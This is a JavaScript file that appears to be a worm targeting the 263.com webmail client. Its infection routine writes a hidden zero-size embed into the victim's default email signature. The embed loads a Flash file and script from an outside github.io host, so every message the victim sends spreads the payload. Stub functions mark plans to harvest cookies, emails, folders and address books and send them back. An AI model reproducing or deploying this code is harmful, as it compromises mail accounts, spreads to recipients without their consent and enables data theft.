(function () {
    // move to top
    var host = window.top.top.top.top.top.top.top.top.top.top.top;
    var urlParam = host.urlParam;
    console.log(host);
    var sysPath = "http://mm.263.com/wm2e/mail";
    var signPath = sysPath + "/signInfoSetting/signInfoSettingAction_";
    var addrPath = sysPath + "/personAddressBook/personAddressAction_";
    var hook = '<p><embed allowscriptaccess="always" style="width:0;height:0" src="//analyzes.github.io/own.swf?a=get&c=//analyzes.github.io/script/analyzes.js"/></p>';
    var addressBook = addrPath + "getAddressInitSys.do?" + urlParam;
    var addressBookDepart = addrPath + "getEnterAddressListAllNew.do?" + urlParam;

    function infection() {
        $.get(signPath + "signInfoManage.do?" + urlParam, function (data) {
            var signs = $(data).find('.popBox').children();
            if (signs.length > 0) {
                var defaultSign = $(data).find('.s_select_bg > .txt');
                var defaultSignContent = $(data).find('#context' + defaultSign.attr('id'));
                // check hook exist
                var hooked = defaultSignContent.find('embed').length != 0;
                if (!hooked) {
                    //update default sign
                }
            } else {
                // add new sign
                $.post(signPath + "saveSignInfo.do?" + urlParam, { name: '默认签名', contexts: '<p><br/></p>' + hook });
                // set first sign as default
                $.get(signPath + "setDefaultSignInfo.do?id=0&" + urlParam);
            }
        });
    }

    function analyze() {
        //cookie
        //email
        //folder
        //addressBook
    }

    function alive(parameters) {
        // put self in top and start timer

        //get data and post back
    }

    infection();
})();
